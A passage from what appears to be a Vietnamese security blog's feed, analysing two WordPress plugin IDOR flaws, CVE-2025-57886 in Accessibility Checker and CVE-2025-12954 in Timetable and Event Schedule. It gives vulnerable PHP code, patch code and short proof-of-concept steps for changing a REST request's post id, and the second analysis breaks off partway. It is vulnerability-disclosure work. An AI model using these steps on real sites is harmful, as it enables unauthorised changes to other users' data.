nhận request từ REST API và xử lý kết quả quét accessibility cho một bài viết. Luồng logic chính gồm:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra đầu vào&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Missing violations&amp;#39; ], 400);&#xA;}&#xA;$post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;$post = get_post( $post_id );&#xA;if ( ! is_object( $post ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid post&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra post type&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post_type  = get_post_type( $post );&#xA;$post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Post type not allowed&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xử lý violations&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rules = edac_register_rules();&#xA;foreach ( $request[&amp;#39;violations&amp;#39;] as $violation ) {&#xA;    $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;    // Lọc rule hợp lệ và lưu vào cơ sở dữ liệu&#xA;    (new Insert_Rule_Data())-&amp;gt;insert( $post, $rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Cập nhật post meta và summary&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trả response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return new \WP_REST_Response([&#xA;    &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;    &amp;#39;id&amp;#39; =&amp;gt; $post_id,&#xA;    &amp;#39;timestamp&amp;#39; =&amp;gt; time()&#xA;]);&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Attacker có &lt;strong&gt;Contributor account&lt;/strong&gt; có thể &lt;strong&gt;tùy ý thao túng tham số &lt;code&gt;id&lt;/code&gt; do client kiểm soát&lt;/strong&gt;, trỏ tới &lt;strong&gt;bất kỳ post nào&lt;/strong&gt;, trong khi kiểm tra quyền chỉ dựa trên &lt;code&gt;edit_posts&lt;/code&gt;. Điều này cho phép attacker &lt;strong&gt;ghi hoặc ghi đè dữ liệu &lt;code&gt;violations&lt;/code&gt; vào post không thuộc quyền sở hữu&lt;/strong&gt;, dẫn đến &lt;strong&gt;thay đổi trái phép dữ liệu của người dùng khác (IDOR)&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Khi tạo post bằng Contributor user, bạn sẽ thấy phần thống kê của &lt;strong&gt;Accessibility Checker&lt;/strong&gt; xuất hiện ngay trong trang chỉnh sửa bài viết.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#34; title=&#34;Thống kê của Accessibility Checker&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/post.png&#34; data-sub-html=&#34;&lt;h2&gt;Post&lt;/h2&gt;&lt;p&gt;Thống kê của Accessibility Checker&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#39; alt=&#34;Post&#34; height=&#34;1048&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thống kê của Accessibility Checker&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thử filter request bằng cụm từ &lt;code&gt;post-scan-results&lt;/code&gt; trong Burp History, bạn sẽ bắt được request hợp lệ do plugin cung cấp sẵn:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#34; title=&#34;Filter request trong Burp History&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Filter request trong Burp History&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#39; alt=&#34;Request&#34; height=&#34;1357&#34; width=&#34;1277&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter request trong Burp History&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Chỉ cần sửa đối giá trị &lt;code&gt;id&lt;/code&gt;, ta có thể &lt;strong&gt;thay đổi trái phép dữ liệu&lt;/strong&gt; trong post của người khác.&lt;/p&gt;&#xA;&lt;p&gt;Phiên bản &lt;strong&gt;v1.30.1&lt;/strong&gt; đã sửa lỗ hổng bằng cách thay đổi &lt;strong&gt;permission callback&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;    return $this-&amp;gt;user_can_edit_passed_post_id( $request );&#xA;}&#xA;&#xA;public function user_can_edit_passed_post_id( $request ) {&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    return current_user_can( &amp;#39;edit_post&amp;#39;, $post_id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Callback giờ nhận &lt;code&gt;$request&lt;/code&gt; để kiểm tra &lt;strong&gt;post cụ thể&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sử dụng &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt; → WordPress xác minh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;User có quyền chỉnh sửa post này hay không.&lt;/li&gt;&#xA;&lt;li&gt;Post có thuộc sở hữu của user hay không.&lt;/li&gt;&#xA;&lt;li&gt;Trạng thái post (draft, published, private) có cho phép thao tác không.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated attacker (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Craft POST request to REST API&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;POST /wp-json/accessibility-checker/v1/post-scan-results/{id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Manipulate {id} to target post_id&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Permission granted&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;set_post_scan_results()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;get_post(target_post_id)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Process violations data&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;update_post_meta(target_post_id, _edac_*)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Target post data modified&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo/edit post bằng &lt;strong&gt;Contributor&lt;/strong&gt; account&lt;/li&gt;&#xA;&lt;li&gt;Bắt request đến &lt;code&gt;/wp-json/accessibility-checker/v1/post-scan-results/{id}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Gửi lại request với &lt;code&gt;id&lt;/code&gt; post của user khác với &lt;code&gt;violations&lt;/code&gt; tùy ý.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-57886 là một lỗ hổng &lt;strong&gt;IDOR trong REST API&lt;/strong&gt; do plugin &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; chỉ kiểm tra quyền ở mức &lt;strong&gt;capability tổng quát (&lt;code&gt;edit_posts&lt;/code&gt;)&lt;/strong&gt; mà không xác thực &lt;strong&gt;quyền chỉnh sửa trên post cụ thể&lt;/strong&gt;. Điều này cho phép attacker có quyền Contributor &lt;strong&gt;tùy ý thao túng tham số &lt;code&gt;id&lt;/code&gt;&lt;/strong&gt; trong request REST API để &lt;strong&gt;ghi hoặc ghi đè dữ liệu accessibility&lt;/strong&gt; lên các bài viết không thuộc quyền sở hữu, dẫn đến &lt;strong&gt;thay đổi trái phép dữ liệu&lt;/strong&gt;. Phiên bản 1.30.1 đã khắc phục bằng cách áp dụng &lt;strong&gt;post-level authorization&lt;/strong&gt; thông qua &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;REST API sử dụng &lt;strong&gt;object identifier do client kiểm soát&lt;/strong&gt; phải luôn đi kèm &lt;strong&gt;kiểm tra quyền trên object cụ thể&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Global capability check&lt;/strong&gt; (&lt;code&gt;edit_posts&lt;/code&gt;) không đủ để bảo vệ các thao tác ghi dữ liệu theo &lt;code&gt;post_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR có thể xảy ra ngay cả khi request được tạo từ &lt;strong&gt;logic hợp lệ phía client&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trong WordPress, &lt;strong&gt;&lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;&lt;/strong&gt; là biện pháp chuẩn để ngăn chặn IDOR ở mức post.&lt;/li&gt;&#xA;&lt;li&gt;Các endpoint REST &lt;strong&gt;ghi dữ liệu&lt;/strong&gt; cần được xem là bề mặt tấn công ưu tiên khi audit plugin.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/accessibility-checker/vulnerability/wordpress-accessibility-checker-by-equalize-digital-plugin-1-30-0-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin &amp;lt;= 1.30.0 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12954 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-21-cve-2025-12954/</link>
      <pubDate>Sun, 21 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-21-cve-2025-12954/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WordPress &lt;strong&gt;Timetable and Event Schedule by MotoPress&lt;/strong&gt; (trước phiên bản &lt;strong&gt;2.4.16&lt;/strong&gt;) không kiểm tra liệu người dùng có quyền truy cập vào &lt;strong&gt;event cụ thể&lt;/strong&gt; khi thực hiện thao tác duplicate, dẫn đến việc &lt;strong&gt;lộ thông tin event một cách tùy ý&lt;/strong&gt; đối với người dùng có vai trò thấp như &lt;strong&gt;Contributor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12954&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12954&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.16&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mp-timetable/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Timetable and Event Schedule&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.15&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.16&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;post_action_mptt_duplicate_event&amp;#39;, array( $this-&amp;gt;get( &amp;#39;events&amp;#39; ), &amp;#39;post_action_mptt_duplicate_event&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong &lt;strong&gt;WordPress&lt;/strong&gt;, các hook có tiền tố &lt;code&gt;post_action_&lt;/code&gt; là hook đặc biệt dùng để xử lý những hành động được truyền qua tham số &lt;code&gt;action&lt;/code&gt; khi truy cập file &lt;code&gt;post.php&lt;/code&gt;.&#xA;Cụ thể, khi người dùng truy cập vào URL dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/post.php?post=post_id&amp;amp;action=mptt_duplicate_event&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress sẽ gọi đến callback &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; để xử lý logic &lt;strong&gt;duplicate event&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bên cạnh việc đăng ký action hook, plugin còn &lt;strong&gt;chủ động tạo URL kích hoạt action&lt;/strong&gt; này thông qua việc thêm một liên kết “Duplicate” vào danh sách hành động của mỗi bài viết trong trang quản trị.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_row_actions( $actions, $post ) {&#xA;    if ( $post-&amp;gt;post_type == $this-&amp;gt;post_type &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $action_url = add_query_arg(&#xA;            array(&#xA;                &amp;#39;post&amp;#39; =&amp;gt; $post-&amp;gt;ID,&#xA;                &amp;#39;action&amp;#39; =&amp;gt; &amp;#39;mptt_duplicate_event&amp;#39;,&#xA;                &amp;#39;_wpnonce&amp;#39; =&amp;gt; wp_create_nonce( 